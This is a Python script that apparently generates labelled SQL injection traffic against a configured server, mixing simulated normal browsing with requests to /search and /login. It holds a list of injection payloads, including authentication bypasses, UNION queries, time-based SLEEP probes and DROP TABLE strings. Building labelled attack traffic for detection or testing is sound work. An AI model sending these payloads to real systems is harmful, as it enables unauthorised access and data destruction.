import sys
import random
import requests

from config import BASE_URL, SEED_USERS, new_session_id, base_headers
import common

SQLI_PAYLOADS = [
    "' OR '1'='1", "admin'--", "' OR 1=1--", "'; DROP TABLE users;--",
    "' UNION SELECT NULL,NULL,NULL--", "admin' #", "' OR 'x'='x",
    "1' AND SLEEP(5)--", "' OR '1'='1' /*", "') OR ('1'='1",
    "phone' OR '1'='1", "laptop'; DROP TABLE products;--",
]


def sqli_session():
    user = random.choice(SEED_USERS)
    sid = new_session_id()
    ip = common.make_ip()
    token, uid = common.login(user, "normal", sid, ip)
    if not token:
        return
    common.browse_normal(sid, ip, token, uid, rounds=random.randint(1, 3))
    for _ in range(random.randint(3, 7)):
        payload = random.choice(SQLI_PAYLOADS)
        if random.random() < 0.6:
            h = common.auth_headers("sql_injection", sid, ip, token)
            requests.get(f"{BASE_URL}/search", params={"q": payload}, headers=h)
        else:
            h = base_headers("sql_injection", sid, ip=ip)
            requests.post(f"{BASE_URL}/login",
                          json={"username": payload, "password": payload}, headers=h)


def run(n):
    print(f"Generating {n} SQLi sessions...")
    for i in range(n):
        sqli_session()
    print("SQL injection traffic complete.")


if __name__ == "__main__":
    run(int(sys.argv[1]) if len(sys.argv) > 1 else 20)
